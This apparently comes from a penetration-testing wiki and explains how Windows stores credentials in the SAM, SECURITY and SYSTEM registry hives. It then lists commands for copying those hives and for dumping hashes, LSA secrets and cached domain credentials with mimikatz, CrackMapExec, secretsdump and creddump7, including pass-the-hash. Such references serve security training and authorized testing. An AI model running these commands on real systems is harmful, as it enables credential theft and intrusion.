# SAM & LSA secrets & Cached Domain Credentials

### Theory

On Windows systems, credentials are stored in different hashed formats in the registry hives (SAM and SECURITY). However, we also need the SYSTEM hive which contains the system boot key (or System Key) that allows decrypting the above mentioned hives.

|   Hive   |                                             Description                                            |                                                                                                    Credentials                                                                                                   |
| :------: | :------------------------------------------------------------------------------------------------: | :--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------: |
|    SAM   |                          Stores locally cached credentials (SAM secrets).                          |                                                                        <ul><li>LM/NT hashes (in rare cases, plaintext passwords)</li></ul>                                                                       |
| SECURITY |                                         Stores LSA secrets.                                        | <ul><li>LM/NT hashes (service accounts, SYSTEM account, etc.)</li><li>Cached Domain Credentials (DCC1 and DCC2)</li><li>DPAPI master keys</li><li>Security Questions (<code>L$_SQSA_&#x3C;SID></code>)</li></ul> |
|  SYSTEM  | It contains the system boot key (or System Key) that allows decrypting the SECURITY and SAM hives. |                                                                                                                                                                                                                  |

For a more detailed look at what is contained in SAM/LSA secrets and other types of credentials/keys, see the "Windows computers credentials" section of the following resource:

{% content-ref url="../../../active-directory/theory/06.-computers/2.-windows-computers.md" %}
[2.-windows-computers.md](../../../active-directory/theory/06.-computers/2.-windows-computers.md)
{% endcontent-ref %}

### Exfiltration

{% hint style="warning" %}
Remember that if Windows is running, the hives are in use and therefore, we can only create a copy and then transfer them. If it is not in use (for example, if we got a hard disk with the entire Windows file system), we can transfer it directly.
{% endhint %}

{% tabs %}
{% tab title="reg" %}
```
reg save HKLM\SAM SAM.bak
reg save HKLM\SYSTEM SYSTEM.bak
reg save HKLM\SECURITY SECURITY.bak
```
{% endtab %}

{% tab title="esentutl.exe" %}
```shell
esentutl.exe /y /vss C:\Windows\System32\config\SYSTEM /d c:\temp\system
esentutl.exe /y /vss C:\Windows\System32\config\SAM /d c:\temp\sam
esentutl.exe /y /vss C:\Windows\System32\config\SECURITY /d c:\temp\security
```
{% endtab %}
{% endtabs %}

### Practice

{% tabs %}
{% tab title="mimikatz" %}
{% hint style="info" %}
For unstable shells, we can use all commands in an oneliner (see below).
{% endhint %}

```bash
token::elevate # To acquire a session as the SYSTEM user.
privilege::debug # Enable SeDebugPrivilege.

# Oneliner:
.\mimikatz.exe "token::elevate" "privilege::debug" "<COMMAND>" exit

# Dump credentials of the local account (SAM):
lsadump::sam # Local
lsadump::sam /patch # Local
lsadump::sam /sam:'C:\path\to\SAM' /system:'C:\path\to\SYSTEM' # Offline.

# Dump LSA secrets:
lsadump::secrets # Local
lsadump::secrets /system:'c:\path\to\SYSTEM' /security:'c:\path\to\SECURITY' # Offline.

# Dump cached domain credentials (SECURITY hive):
lsadump::cache # Local
lsadump::cache /security:'C:\path\to\SECURITY' /system:'C:\path\to\SYSTEM' # Offline
```
{% endtab %}

{% tab title="CrackMapExec" %}
```bash
# Remote dump SAM/LSA secrets:
crackmapexec smb <TARGET> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> --sam
crackmapexec smb <TARGET> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> --lsa

# Remote dump SAM/LSA secrets (local authentication):
crackmapexec smb <TARGET> -u <USERNAME> -p <PASSWORD> --local-auth --sam
crackmapexec smb <TARGET> -u <USERNAME> -p <PASSWORD> --local-auth --lsa

# Remote dump SAM/LSA secrets (Pass-The-Hash):
crackmapexec smb <TARGET> -d <DOMAIN> -u <USERNAME> -H <HASH> --sam
crackmapexec smb <TARGET> -d <DOMAIN> -u <USERNAME> -H <HASH> --lsa

# Remote dump SAM/LSA secrets (Pass-The-Ticket):
crackmapexec smb <TARGET> --kerberos --sam
crackmapexec smb <TARGET> --kerberos --lsa
```
{% endtab %}

{% tab title="secretsdump" %}
```bash
# Remote dump SAM/LSA secrets:
secretsdump.py '<DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET>'

# Remote dump SAM/LSA secrets (Pass-The-Hash):
secretsdump.py -hashes '<HASH>' '<DOMAIN>/<USERNAME>@<TARGET>'

# Remote dump SAM/LSA secrets (Pass-The-Ticket):
secretsdump.py -k '<DOMAIN>/<USERNAME>@<TARGET>'

# Offline dump SAM/LSA secrets from SYSTEM, SAM and SECUTIRY hives:
secretsdump.py -system SYSTEM -sam SAM LOCAL # SAM secrets
secretsdump.py -system SYSTEM -security SECURITY LOCAL # LSA Secrets
secretsdump.py -system SYSTEM -sam SAM -security SECURITY LOCAL # Both.
```
{% endtab %}

{% tab title="creddump7" %}
```bash
# Installation:
git clone https://github.com/Neohapsis/creddump7 # Python2
git clone https://github.com/Tib3rius/creddump7 # Python2/3
# Dependencies:
pip2 install pycrypto
pip3 install pycrypto
# Use:
python2 creddump7/pwdump.py SYSTEM SAM # SAM secrets
python2 creddump7/pwdump.py SYSTEM SECURITY # LSA secrets
python3 creddump7/pwdump.py SYSTEM SAM SECURITY # Both.
```

{% hint style="danger" %}
If there are problems with the functionality of the script, we can do the following: `pip install pycryptodome==3.4.3`
{% endhint %}
{% endtab %}
{% endtabs %}
